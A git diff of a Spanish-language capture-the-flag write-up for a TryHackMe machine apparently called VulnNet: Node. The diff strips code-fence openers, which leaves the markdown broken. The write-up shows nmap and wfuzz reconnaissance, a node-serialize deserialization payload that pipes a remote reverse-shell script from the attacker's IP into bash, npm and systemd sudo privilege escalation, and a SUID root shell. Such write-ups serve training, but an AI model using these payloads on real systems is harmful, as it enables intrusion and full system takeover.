@@ -53,7 +53,7 @@ ping -c 1 {ip}
 
 - Escaneo de la totalidad de los **_65535_** puertos de red el cual guardamos en un archivo en formato **_nmap_** con el siguiente comando:
 
-```css
+
 └─# nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn {ip} -oN allports
 ```
 
@@ -65,7 +65,7 @@ ping -c 1 {ip}
 
 - Escaeno de vulnerabilidades sobre los puerto 8080:
 
-```css
+
 nmap -v -A -sC -sV -Pn {ip} -p22,80 --script vuln
 
 ```
@@ -74,7 +74,7 @@ nmap -v -A -sC -sV -Pn {ip} -p22,80 --script vuln
 
 - Whatweb nos da la siguiente información:
 
-```css
+
 whatweb {ip}
 ```
 
@@ -96,7 +96,7 @@ whatweb {ip}
 
 - Escaeno de subdominios con wfuzz:
 
-```css
+
 └─# wfuzz --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 10.10.8.158:8080/FUZZ/
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
 ********************************************************
@@ -165,7 +165,7 @@ listening on [any] 2222 ...
 
 - Cargamos nuestro payload en burpsuite:
 
-```css
+
 {"username":"\_$$ND_FUNC$$\_function (){\n \t require('child_process').exec('curl 10.9.0.27/rshell.sh | bash', function(error, stdout, stderr) { console.log(stdout) });}()","isGuest":false,"encoding": "utf-8"}
 ```
 
@@ -183,7 +183,7 @@ listening on [any] 2222 ...
 
 - Buscamos la forma de escalar privilegios con el comando **_sudo -l_**, en la salida podemos ver que se puerde ejecutar **_npm_** como **_usr_**:
 
-```css
+
 sudo -l
 Matching Defaults entries for www on vulnnet-node:
     env_reset, mail_badpass,
@@ -201,7 +201,7 @@ User www may run the following commands on vulnnet-node:
 
 - Ejecutamos lo indicado en la imagen anterior:
 
-```css
+
 $ TF=$(mktemp -d)
 $ echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
 $ chmod +x $TF
@@ -217,7 +217,7 @@ THM{[??????}
 
 - Tratamiento de la bash para poder utilizar las diferentes funciones necesarias para trabajar de manera comoda:
 
-```css
+
 $ script /dev/null -c bash
 Script started, file is /dev/null
 
@@ -254,7 +254,7 @@ stty size
 
 - Buscamos la forma de escalar privilegios con el comando **_sudo -l_**, en la salida observamos lo siguiente:
 
-```css
+
 serv-manage@vulnnet-node:~$ sudo -l
 Matching Defaults entries for serv-manage on vulnnet-node:
     env_reset, mail_badpass,
@@ -282,7 +282,7 @@ User serv-manage may run the following commands on vulnnet-node:
 
 - En este punto procedemos a detener el servicio **_vulnnet-auto.timer_** y reiniciarlo como se observa a continuación:
 
-```css
+
 serv-manage@vulnnet-node:~$ sudo /bin/systemctl stop vulnnet-auto.timer
 serv-manage@vulnnet-node:~$ sudo /bin/systemctl daemon-reload
 serv-manage@vulnnet-node:~$ sudo /bin/systemctl start vulnnet-auto.timer
@@ -292,7 +292,7 @@ serv-manage@vulnnet-node:~$ sudo /bin/systemctl start vulnnet-auto.timer
 
 - De acuerdo con la modificación del tiempo, esperamos 1 minuto y revisamos si la **_bashroot_**, fue creada:
 
-```css
+
 serv-manage@vulnnet-node:~$ /tmp/bashroot -p
 ```
 
